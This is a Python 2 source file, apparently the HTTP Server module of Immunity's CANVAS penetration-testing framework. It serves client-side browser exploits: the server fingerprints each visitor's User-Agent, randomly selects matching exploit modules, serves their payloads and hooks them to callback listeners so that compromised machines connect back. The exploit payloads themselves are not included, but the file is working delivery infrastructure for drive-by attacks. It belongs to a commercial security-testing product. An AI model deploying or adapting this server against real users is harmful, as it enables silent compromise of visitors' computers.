#! /usr/bin/env python

#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

import socket
import canvasengine
from exploitutils import *

from ExploitTypes.localcommand import LocalCommand

import time
import random
import logging


NAME                          = "HTTP Server"
DESCRIPTION                   = "HTTP Server for client side vulnerabilities"
DOCUMENTATION                 = {}
DOCUMENTATION["HTTP MOSDEF"]  = "All modules with DELIVERY set to HTTP."
DOCUMENTATION["Command Line"] = "If you're using this on the commandline, you'll probably want to use -O singleexploit:wmf_setabort or similar or it will go through its own list of exploits"
VERSION                       = "1.0"

import re

PROPERTY = {}
PROPERTY['TYPE'] = "Servers"

NOTES="""
"""

CHANGELOG="""
"""

redirpage="""
<html>
<head>
<meta http-equiv="refresh" content="1">
</head>
<body>
CONTENT
</body>
</html>

"""

from libs.spkproxy import header, body
from canvasengine import WIN32MOSDEF, JAVASERVER, HTTPMOSDEF, HTTPMOSDEF_SSL
from exploitutils import gzipBuffer

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)

        self.port                                 = 80
        self.version                              = 1
        # force engine to use hand selected callback interface .. can't use autofind
        self.autoFind                             = False
        self.name                                 = NAME
        self.num                                  = 0
        self.exploitslist                         = {}
        self.allowexploits                        = []
        self.listenerArgsDict["fromcreatethread"] = 1
        self.singleexploit                        = ""
        self.singleshot                           = False
        self.response_count                       = 0
        self.response_threshold                   = 0
        # XXX: toggle this for HTTP MOSDEF connectbacks !
        self.HTTPMOSDEF                           = False
        self.useSSLMOSDEF                         = False
        self.HTTPPROXYPORT                        = 8080
        self.bindip                               = "0.0.0.0"
        self.optarguments                         = ""

        # Automatically determine port to bind/listen when the one given is not
        # available
        self.auto_port                            = False
        # Max number of times to try a random port
        self.auto_port_tries                      = 30
        self.s                                    = None


    def get_client_sides( self ):
        useable_exploits = []
        mod_list = canvasengine.exploitmodsGet()

        for mod in mod_list:
            try:
                if mod_list[mod].PROPERTY["SITE"] == "Clientside" and mod_list[mod].PROPERTY['DELIVERY'] == "HTTP":
                    logging.debug("Added: %s" % mod_list[mod].NAME)
                    useable_exploits.append( mod )
            except:
                logging.warning("Skipped: %s" % mod_list[mod].NAME)

        return useable_exploits

    def neededListenerTypes(self):
        #We actually need something a lot more sophisticated here...but this will do for now
        #assuming we only have win32 sploits in the list...which isn't really true

        self.HTTPMOSDEF    = int(self.argsDict.get('httpmosdef', self.HTTPMOSDEF))
        self.HTTPPROXYPORT = int(self.argsDict.get('httpproxyport', self.HTTPPROXYPORT))
        self.useSSLMOSDEF  = bool(int(self.argsDict.get('ssl', self.useSSLMOSDEF)))

        if self.HTTPMOSDEF:
            print "[!] HTTP Server using HTTP MOSDEF listener .."
            self.listenerArgsDict['fromcreatethread']   = 0
            self.listenerArgsDict['HTTPPROXYPORT']      = self.HTTPPROXYPORT
            if self.useSSLMOSDEF:
                print "[!] HTTP MOSDEF SSL Enabled .."
                return [HTTPMOSDEF_SSL]
            else:
                print "[!] HTTP MOSDEF SSL Disabled .."
                return [HTTPMOSDEF]
        else:
            self.getargs()
            if self.singleexploit != "":
                try:
                    e = self.engine.getModuleExploit(self.singleexploit)
                except canvasengine.CANVASENGINEException, m:
                    self.log("Could not find module: %s!"%self.singleexploit)
                    #failed!
                    return []
                self.listenerArgsDict = e.listenerArgsDict
                return e.neededListenerTypes()

            else:
                # Horridly assume that we want win32 :D
                self.log("[!] HTTP Server using WIN32 MOSDEF listener ...")
                return [WIN32MOSDEF]

    # returns a (brownser, [list of tags], extra info)
    # for example:
    #  ("Mozilla/4.0", ["compatible", "MSIE 6.0",  "Windows NT 5.1"], "Opera 7.23 [en]")

    def parseUserAgent(self, useragent):
        """
        Parsing User Agent
        """
        ndx = useragent.find("(")
        if ndx == -1:
            if useragent[:4] in ["Lynx", "Wget"]:
                #Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d
                version=useragent.split(" ")[0]
                others=useragent.split(" ")[1:]
                return (version,others)
            return None
        import string
        browser = string.strip(useragent[:ndx])
        # Looking for info between parentesis
        ndx += 1
        endtags = useragent[ndx:].find(")")

        if endtags == -1:
            return (browser, [ useragent[ndx:] ], "")
        endtags+=ndx

        tags = useragent[ndx:endtags].split(";")
        ndx  = endtags + 1
        extrainfo = string.strip( useragent[ndx:] )

        return (browser, tags, extrainfo)

    def CheckUserAgent(self, useragent):
        """
        Sort the exploits we use by data and see which ones we should use
        This function fills up the self.allowexploits list, which is
        what self.makesploit uses.
        """
        #print useragent
        self.log("Checking user agent: *%s*"%str(useragent))
        self.allowexploits = []
        for date in self.exploitslist:
            self.log("Looking into exploit of data: %s"%date)

            #here we check solely based on user agent - this has been depreciated in favor of smarter clientd behavior
            if hasattr(self.exploitslist[date],"searchMethod") and self.exploitslist[date].searchMethod(useragent):
                self.allowexploits.append(date) #seems like this should be self.exploitslist[date] ?

        self.allowexploits.sort()
        self.allowexploits.reverse() # from early date (bigger) to older date (smaller)

    def handle(self, infd):
        """
        handle a connection
        should really be in its own thread
        """
        self.log("Handling connection")
        clientheader=header(state="SERVER")
        clientheader.ssl=False
        ret=clientheader.readdata(infd)
        clientbody=body()
        #initialize this with everything, in case we get NO user agent
        self.CheckUserAgent("")
        if clientheader.gotGoodHeader():
            self.log("Got good request")
            useragent = clientheader.getHeaderValue('User-Agent')
            self.log("Useragent: %s"%useragent)
            if useragent != "":
                agentinfo = self.parseUserAgent(useragent)
                if agentinfo==None:
                    agentinfo=""
                self.log("User-Agent: %s" % str(agentinfo))
                self.CheckUserAgent(agentinfo)
                self.log("Allowexploits=%s"%self.allowexploits)
                if self.allowexploits == []:
                    self.log("No exploit with a compatible User-Agent, ignoring...")
                    infd.close()
                    return 0

            if clientheader.bodySize()>0 or clientheader.wasChunked:
                self.log("Reading body")
                #readtillclosed always 0 on client
                clientbody.read(infd,clientheader.bodySize(),clientheader.wasChunked,0)
                self.log("Read body")

        self.log("Creating exploit response")

        #servbody = exploit
        servheader,servbody, exploit=self.makesploit(clientheader,clientbody)

        self.log("Responding")
        if servheader==None:
            #no header, we're done...
            self.log("Exploit returned None - we must be done...")
            infd.close()
            return
        else:
            if exploit.cangzip:
                servheader.setcanzip( clientheader )

        bodydata="".join(servbody.data)
        if servheader.cangzip and exploit.cangzip:
            bodydata=gzipBuffer(bodydata)
            servheader.addHeader("Content-Encoding","gzip")
            self.log("gzip encoding enabled: body is %d bytes"%len(bodydata))

        # If the mimetype was set explicitly in the
        # exploit then test for it and adjust the response
        # headers appropriately.
        if hasattr(exploit, "mimetype") and exploit.mimetype is not None:
            if servheader.hasHeader("Content-Type"):
                servheader.setHeader("Content-Type",exploit.mimetype)
            else:
                servheader.addHeader("Content-Type",exploit.mimetype)

        #now we respond...
        response=""
        response+="%s %s %s\r\n"%(servheader.version,servheader.status,servheader.msg)

        #We might want to screw our Content-Length ;)
        havecontentlength=False
        for akey in servheader.headerValuesDict.keys():
            if akey.lower() == "content-length":
                havecontentlength=True
            response+=servheader.grabHeader(akey)
        self.log("Sending header data of %d bytes"%len(response))
        chunked=0 #for now, eventually we'll send random chunks down the pipe.\..
        if not chunked and not havecontentlength:
            response+="Content-Length: "+str(len(bodydata))+"\r\n"
        response+="\r\n"
        response+="".join(bodydata)
        self.log("Total response length is %d bytes"%len(response))
        try:
            infd.sendall(response)
        except socket.error:
            self.log("Connection closed by peer")
        self.log("Response sent")
        infd.close() #connection close - later on we'll keep it.

        # We silently track the response count, so that singleshots
        # (which are mainly for testing) can be kept track of
        self.response_count += 1

    def create_clientside_arguments(self):
        #used to create a dictionary that can be passed into the clientside exploit to pull out info that it *MAY* need
        clientside_args = {
            "HTTPMOSDEF"         : self.HTTPMOSDEF,
            "useSSLMOSDEF"       : self.useSSLMOSDEF,
            "HTTPPROXYPORT"      : self.HTTPPROXYPORT,
            "bindip"             : self.bindip, #let's not use this if we can avoid it.
            "bindport"           : self.port,
            "response_threshold" : self.response_threshold,
            "issilica"           : self.silica,
        }
        #process each argument passed in from the glade and add it to our dictionary
        tempargsdict={}

        for element in self.optarguments.split(" "):
            try:
                e     = element.split(":")
                key   = e[0]
                value = e[1]
                tempargsdict[key]=value
            except:
                pass

        clientside_args["user_supplied_args"]=tempargsdict

        return clientside_args


    def fillexploitlist(self):
        """
        we have a list of exploits we run one by one...
        each exploit is responsible for telling us when it's done so it can do multiple requests...
        """
        n = 0
        if self.singleexploit:
            #specified on command line
            self.log("Using single exploit in http server (%s)" % self.singleexploit)
            self.exploitslist[0] = self.engine.getModuleExploit(self.singleexploit)
            self.exploitslist[0].HTTPMOSDEF     = self.HTTPMOSDEF
            self.exploitslist[0].useSSLMOSDEF   = self.useSSLMOSDEF
            self.exploitslist[0].clientsideargs = self.create_clientside_arguments()
            self.exploitslist[0].link(self) #this will copy argsDict, etc.

            #for e in self.exploitslist:
            #    e.link(self)
            self.log("Loaded and linked %s" % self.singleexploit)
        else:
            #use our built in list
            for mod in self.get_client_sides():
                ret=self.engine.getModule(mod)

                if ret:
                    if ret.DOCUMENTATION.has_key("Date public"):
                        date = ret.DOCUMENTATION["Date public"]

                        try:
                            date = time.mktime(time.strptime(date, "%m/%d/%Y"))
                        except ValueError:

                            try:
                                date= time.mktime(time.strptime(date, "%m/%d/%Y"))
                            except ValueError:
                                self.log("Invalid format for Date public: %s" % date)
                                date = n
                                n += 1
                    else:
                        date = n
                        n += 1

                    self.log("Loaded %s"%mod)
                    exploit = ret.theexploit()
                    exploit.HTTPMOSDEF = self.HTTPMOSDEF
                    exploit.useSSLMOSDEF = self.useSSLMOSDEF
                    exploit.clientsideargs=self.create_clientside_arguments()
                    exploit.link(self)

                    self.log("Linked %s"%mod)
                    self.exploitslist[date] = exploit

    def getargs(self):
        self.HTTPMOSDEF         = int(self.argsDict.get("httpmosdef", self.HTTPMOSDEF))
        self.HTTPPROXYPORT      = int(self.argsDict.get('httpproxyport', self.HTTPPROXYPORT))
        self.useSSLMOSDEF       = int(self.argsDict.get("ssl", self.useSSLMOSDEF))
        self.port               = int(self.argsDict.get("port", self.port))
        self.singleexploit      = self.argsDict.get("singleexploit", self.singleexploit)
        self.bindip             = self.argsDict.get("bindip", self.bindip)
        self.singleshot         = self.argsDict.get("singleshot", self.singleshot)
        self.response_threshold = self.getarg("response_threshold")
        self.optarguments       = self.argsDict.get("arguments", self.optarguments)
        self.silica             = self.argsDict.get("silica", False)
        self.auto_port          = self.argsDict.get("auto_port", self.auto_port)
        self.auto_port_tries    = self.argsDict.get("auto_port_tries", self.auto_port_tries)


    def listen(self):
        self.getargs()
        s = self.gettcplistener(self.port, self.bindip)

        if not s:
            if self.port < 1024:
                self.log("Cannot listen on port %d - perhaps we need to be root or that port is already bound? " \
                         "you can try to bind to a higher port" % self.port)
            else:
                self.log("Cannot listen on port %d - perhaps that port is already bound?" % self.port)

            if self.auto_port:
                for _ in range(0, self.auto_port_tries):
                    self.port = random.randint(1025, 65000)
                    self.log('httpserver: auto_port is set, trying random port %d' % self.port)
                    s = self.gettcplistener(self.port, self.bindip)
                    if s: break

            if not s: return 0

        s.set_timeout(5)
        self.fillexploitlist()
        self.s = s
        return s

    def accept(self, s=None ):
        """
        Try to accept one connection
        returns true if we found one
        """

        # First we check to make sure we haven't fulfilled the response_threshold
        if self.singleshot and self.response_count == self.response_threshold:
            self.log("Response Count == Response Threshhold: %d"%self.response_count)
            self.log("Not accepting the connection!")
            return False

        if self.s == None:
            self.log('Aborting accept() as listen() was not successful')
            return False

        #we loop on this ,so no annoying printouts here
        #self.log("Accepting connection")
        if s==None:
            s=self.s

        # If this is a remote HTTP server that is used as a bounce,
        # then we make sure that the socket is non-blocking
        if self.argsDict.get("passednodes")[0].nodetype != "LocalNode":
            blocking = 0
        else:
            blocking = 1

        try:
            # If this is a MOSDEFSock we pass in a blocking parameter
            infd,addr=s.accept(blocking=blocking)
            self.log("Accepted a connection from %s:%d"%(addr[0],addr[1]))
        except TypeError:
            # If it was a regular socket, then a TypeError would be raised
            # and we don't pass in a blocking parameter, we just do a regular accept()

            try:
                infd,addr=s.accept()
                self.log("Accepted a connection from %s:%d"%(addr[0],addr[1]))
            except timeoutsocket.Timeout:
                return None

        except timeoutsocket.Timeout:
            return

        if infd==-1:
            return None

        self.handle(infd)
        return True #handled connection

    def run(self):

        # check if we're a node type that supports the httpserver module
        node = self.argsDict['passednodes'][0]
        if node.nodetype not in ['LocalNode', 'win32Node']:
            self.log('[X] Sorry, you can not start a HTTP Server on that nodeType')
            return 0

        self.getargs()
        #if self.target.interface==None:
        #    devlog("canvasexploit","Why is our target interface==None?!? %s"%str(self.target))

        self.log("Listening on host %s:%d"%(self.bindip,self.port))

        s=self.listen()

        if not s:
            self.log("Failed to listen - not running")
            return 0

        if self.singleexploit:
            self.setInfo("%s (%s) on %s:%d - listening"%(NAME,self.singleexploit, self.bindip,self.port))
        else:
            self.setInfo("%s on %s:%d - listening"%(NAME, self.bindip,self.port))

        while 1:
            # Uncomment this line for testomatic testing
            #self.log("Response count: %d" % self.response_count)
            if self.state==self.HALT:
                self.s.close()
                break

            # when testomaticing comment out the below block
            # it will tell you the final response count to plug into your testcase
            # BEGIN COMMENT BLOCK
            elif self.singleshot == True and self.response_count == self.response_threshold:
                self.s.close()
                self.state = self.HALT
                break

            # END COMMENT BLOCK
            ret=self.accept() #also handles any incoming connections
            if ret==False:
                #accept returns false/true/None - False means "response_count exceeded"
                return 0


        # reached when user chooses to halt webserver

        self.setInfo("%s on %s:%d - done (success!)" % (NAME, self.bindip, self.port))
        return 1


    def makesploit(self,clientheader,clientbody):
        """
        returns serverheader,serverbody, exploit_we_used
        """
        # allowexploit is a list of "date" sort()'ed
        self.log("Allowed Exploits is of length: %d"%len(self.allowexploits))
        # randomize exploit list so we won't always try the first exploit
        # this also reduces the chances of constantly failing because for some exploits
        # there is no way of knowing from the user agent if it's installed on the remote machine.
        # Ideally this should keep sessions and create a black list of failed exploits per host
        # and then redirect them back to the server with a 302 request

        random.shuffle(self.allowexploits)

        for date in self.allowexploits:
            exploit = self.exploitslist[date]
            self.log("Looking at exploit: %s"%exploit.name)
            if exploit.state!="done":
                self.log("Using: %s"%exploit.name)
                try:
                    ret = exploit.makesploit(clientheader,clientbody)
                    return ret[0], ret[1], exploit
                except:
                    print "Error in exploit!"
                    self.log("Exception caught in exploit!")
                    import traceback
                    traceback.print_exc(file=sys.stderr)

        self.log("No exploit to run!")
        return None, None, None


# Updates singleexploit on selection change in the treeview
def on_selection_changed(selection, singleexploit):
    model, rows = selection.get_selected_rows()
    if rows:
        iter = model.get_iter(rows[0])
        singleexploit.set_text(model.get_value(iter,0))


# Fills treeview
def dialog_update(gtk, wTree):

    import gobject
    treemodel = gtk.TreeStore(gobject.TYPE_STRING, gobject.TYPE_STRING)
    treeview = wTree.get_widget('treeview1')
    singleexploit = wTree.get_widget('singleexploit')

    # do not initialize twice
    if len(treeview.get_columns()) != 0:
        return

    useable_exploits = []
    mod_list = canvasengine.exploitmodsGet()

    for mod in mod_list:
        try:
            if mod_list[mod].PROPERTY["SITE"] == "Clientside" and mod_list[mod].PROPERTY['DELIVERY'] == "HTTP":
                treemodel.append( None, [mod, mod_list[mod].DESCRIPTION] )
        except:
            pass

    nameColumn = gtk.TreeViewColumn('Name')
    descrColumn = gtk.TreeViewColumn('Description')

    treeview.append_column(nameColumn)
    treeview.append_column(descrColumn)

    nameCell = gtk.CellRendererText()
    descrCell = gtk.CellRendererText()

    # add the cell to the tvcolumn and allow it to expand
    nameColumn.pack_start(nameCell, True)
    descrColumn.pack_start(descrCell, True)

    # set the cell "text" attribute to column 0 - retrieve text
    # from that column in treestore
    nameColumn.add_attribute(nameCell, 'text', 0)
    descrColumn.add_attribute(descrCell, 'text', 1)

    # make it searchable
    treeview.set_search_column(0)

    # Allow sorting on the column
    nameColumn.set_sort_column_id(0)

    treeview.set_headers_visible(True)
    treeview.set_model(treemodel)
    treeview.show()

    selection = treeview.get_selection()
    selection.connect('changed', on_selection_changed, singleexploit)




if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

